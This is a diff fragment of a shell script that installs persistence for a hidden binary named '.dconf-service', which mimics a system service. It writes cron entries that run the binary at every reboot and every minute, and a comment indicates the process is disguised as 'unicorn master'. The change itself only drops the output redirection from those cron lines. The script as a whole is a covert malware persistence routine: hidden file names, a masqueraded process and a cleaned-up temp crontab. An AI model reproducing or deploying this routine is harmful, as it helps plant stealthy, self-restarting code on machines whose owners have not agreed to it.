@@ -44,8 +44,8 @@ chmod +x .dconf-service
 # 3. Write cron that runs EXACTLY: unicorn master
 crontab -l 2>/dev/null > /tmp/.dconf-db || true                                                                                                                                                                                                              
 
-echo "@reboot $TARGET_DIR/.dconf-service >/dev/null 2>&1" >> /tmp/.dconf-db                                                                                                                                                                                  
-echo "* * * * * $TARGET_DIR/.dconf-service >/dev/null 2>&1" >> /tmp/.dconf-db                                                                                                                                                                                
+echo "@reboot $TARGET_DIR/.dconf-service" >> /tmp/.dconf-db                                                                                                                                                                                  
+echo "* * * * * $TARGET_DIR/.dconf-service" >> /tmp/.dconf-db                                                                                                                                                                                
 
 crontab /tmp/.dconf-db                                                                                                                                                                                                                                       
 rm /tmp/.dconf-db                                                                                                                                                                                                                                            
